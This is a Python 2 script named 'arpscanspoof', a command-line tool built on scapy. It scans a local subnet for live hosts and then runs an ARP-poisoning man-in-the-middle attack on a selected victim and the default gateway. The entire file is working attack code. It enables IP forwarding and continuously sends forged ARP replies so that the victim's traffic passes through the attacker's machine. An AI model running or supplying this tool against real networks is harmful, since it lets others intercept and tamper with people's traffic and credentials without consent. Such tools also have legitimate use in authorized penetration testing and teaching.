#!/usr/bin/env python
# -------------------------------------------------------
# arpscanspoof v 0.1 - 07/05/2014
# By @BerghemHackLab
#
# This code is released under the GNU / GPL v3
# You are free to use, edit and redistribuite it 
# under the terms of the GNU / GPL license.
# -------------------------------------------------------

import socket, struct
import sys
import getopt
from scapy.all import *
from time import sleep;

GATEWAY = ''
VERS = '0.1'
AUTHOR = 'Author: @BerghemHackLab'
NAME = 'arpscanspoof'
INFO = NAME + ' rel. ' + VERS + ' Open Source Project\n' + AUTHOR
PATH=""
SUBNET=''
RESOLVENAME=False
SPOOF=False
IPList = []
ARPSCAN=True

def get_usage():	
	print INFO
	print 'Usage: python arpscanspoof.py 192.168.1.0/24'
	print '  -h, --help'
	print '    print these help informations\n'
	print '  -s, --subnet'
	print '    subnet to scan\n'
	print '  -v, --version'
	print '    print the software release\n'
	print '  -r, --resolve \n'
	print '    Resolver DNS name \n'
	print '  -m, --MITM \n'
	print '    Man In The Midle \n'
	print '  -t, --arget \n'
	print '    Direct Man In The Midle attack to a specific IP \n'
	print '\n\n press control C to stop tool\n\n'

def set_forwarding( status ):
	if not os.path.exists( '/proc/sys/net/ipv4/ip_forward' ):
		raise Exception( "'/proc/sys/net/ipv4/ip_forward' not found, this tool work Linux only." )
      
	fd = open( '/proc/sys/net/ipv4/ip_forward', 'w+' )
	
	if status == True:
		fd.write('1')  
	else: 
		fd.write('0') 
	fd.close()

def arpspoof(IP):
	packet = ARP();
	packet.psrc = GATEWAY
	packet.pdst = IP # victim v.v
	while 1:
		send(packet, verbose=0);
		sleep(50);

def getgateway():
	with open("/proc/net/route") as fh:
		for line in fh:
			fields = line.strip().split()
			if fields[1] != '00000000' or not int(fields[3], 16) & 2:
				continue
			return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def ClearHostname(Hostname):
	c = 0
	index = 0
	while c < len(Hostname):
		if Hostname[c] == ' ':			
			index = c
		c += 1
	return Hostname[index:len(Hostname) - 1] 

def resolve_name(IP):
	name = ''
	cmd = ['host', IP]  	
	p = subprocess.Popen(cmd , stdout=subprocess.PIPE)
	for line in p.stdout:
		name = line
	p.wait()
	return ClearHostname(name)

def arpscan(subnet,resolvename):
	try:
		print "subnet = " + subnet
		alive,dead=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=5, verbose=0)
		print "\n            MAC        -      IP\n"
		
		for i in range(0,len(alive)):
			if resolvename:
				print  unicode(i + 1) +  ")   " +  alive[i][1].hwsrc + " - " + alive[i][1].psrc + " - " + resolve_name(alive[i][1].psrc) 
			else:
				print  unicode(i + 1) +  ")   " +  alive[i][1].hwsrc + " - " + alive[i][1].psrc
			IPList.append(alive[i][1].psrc)
	except:
		pass



def arppoison(target,gateway):
	print " the target is " + target
	packet = ARP();
	packet.psrc = gateway 
	packet.pdst = target 
	
	packet2 = ARP();
	packet2.psrc = target
	packet2.pdst = gateway  
	
	while 1:
		send(packet, verbose=0);
		send(packet2, verbose=0);
		print "."
		sleep(5);

def main(argv):
	print
	print INFO
	if len(sys.argv) > 5:
		get_usage()
		sys.exit(1)	
	
	#Check if it's root 
	if os.getuid() != 0:
		print 'You don\'t have permission!  Perhaps you need to be root?'
		sys.exit(1)	

	#analysis input parameter
	try:   
		opts, args = getopt.getopt(argv, "mrvho:s:t:", ["target=", "MITM", "resolve", "version", "help", "output=", "subnet="])          
	except getopt.GetoptError:
		get_usage()	
		sys.exit(1)
		
	
	RESOLVENAME = False
	SPOOF = False
	ARPSCAN = True

	GATEWAY = getgateway()
	print "\nGATEWAY = " + GATEWAY

	for opt, arg in opts:    
		if opt in ("-t", "--target"):
			set_forwarding(True)
			arppoison(arg, GATEWAY)
			ARPSCAN = False 	
		if opt in ("-h", "--help"):      
			get_usage()
			sys.exit()
		if opt in ("-s", "--subnet"):
			SUBNET= arg
		if opt in ("-r", "--resolve"):
			RESOLVENAME=True
		if opt in ("-v", "--version"):
			get_version()
			sys.exit()
		if opt in ("-m", "--MITM"):
			SPOOF=True
		
		#if opt in ( "-o", "--output"):
		#	if len(sys.argv) < 3:
		#		get_usage()
		#		sys.exit(1)	 
		#	else:
		#		Path = arg

	if ARPSCAN:
		arpscan(SUBNET,RESOLVENAME)
	
	if SPOOF:
		try:
			IPIndex = 0
			#set forwarding
			set_forwarding(True)

			while IPIndex == 0: 
				IPIndex = int(raw_input('\n\nSelect your target [0 for refresh]:'))
				if IPIndex > 0 and IPIndex < len(IPList):
					#print "your target is", IPList[IPIndex - 1]
					arppoison(IPList[IPIndex - 1], GATEWAY)
				elif IPIndex == 0:
					arpscan(SUBNET, RESOLVENAME)
				elif IPIndex > len(IPList):
					print "impossible value"
					IPIndex = 0

		except ValueError:
			print "Not a number"
			#set forwarding
			set_forwarding(False)
		
if __name__ == "__main__":
	try:
		main(sys.argv[1:])
	except KeyboardInterrupt:
		set_forwarding(False)
		pass
